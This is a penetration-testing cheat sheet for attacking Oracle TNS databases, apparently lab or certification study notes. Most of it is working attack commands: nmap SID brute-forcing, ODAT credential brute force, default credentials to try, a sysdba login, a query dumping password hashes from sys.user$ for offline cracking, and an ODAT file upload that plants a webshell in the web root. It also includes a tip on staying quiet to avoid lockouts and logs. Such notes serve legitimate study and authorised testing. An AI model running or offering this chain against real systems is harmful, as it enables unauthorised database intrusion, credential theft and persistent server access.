# Oracle TNS — Footprinting

Port TCP/1521. Requires SID to connect — enumerate it before trying creds. Default creds to always try: `scott/tiger`, `dbsnmp/dbsnmp`, `change_on_install` (Oracle 9 only).

Config files if you get file read: `$ORACLE_HOME/network/admin/tnsnames.ora` (client-side service definitions) and `listener.ora` (server-side listener config).

---

### Enumeration Chain

Nmap — version + confirm port open:

```bash
sudo nmap -p1521 -sV <TARGET> --open
```

Brute-force SID — required before connecting:

```bash
sudo nmap -p1521 -sV <TARGET> --open --script oracle-sid-brute
```

ODAT all modules — cred brute, SID enum, privesc checks, file upload test in one run:

```bash
./odat.py all -s <TARGET>
```

---

### Connect

Standard user:

```bash
sqlplus <USER>/<PASS>@<TARGET>/<SID>
```

As sysdba (if the account has the privilege — always try after getting any creds):

```bash
sqlplus <USER>/<PASS>@<TARGET>/<SID> as sysdba
```

---

### Enumeration Queries

```sql
select table_name from all_tables;
select * from user_role_privs;
select name, password from sys.user$;
```

`sys.user$` → Oracle password hashes → crack offline. Hash format is DES-based for older versions, SHA-based for 11g+.

---

### File Upload → Webshell

Upload via odat `utlfile` module — requires sysdba. Try web root paths:

```bash
./odat.py utlfile -s <TARGET> -d <SID> -U <USER> -P <PASS> --sysdba --putFile C:\\inetpub\\wwwroot <REMOTEFILE> ./<LOCALFILE>
```

Confirm write worked:

```bash
curl -X GET http://<TARGET>/<REMOTEFILE>
```

Linux web root: `/var/www/html`. Windows web root: `C:\inetpub\wwwroot`.

> [!tip] `scott/tiger` is the classic default — ODAT will find it automatically, but try it manually first since ODAT's full scan takes a long time. Once you have any creds, immediately try `as sysdba` — non-obvious accounts are often granted it by lazy admins.

> [!warning] ODAT `all` runs credential brute force — will generate auth failure logs and may trigger lockout if account lockout is configured. Run `sidguesser` and `passwordguesser` separately with controlled wordlists if you need to stay quiet.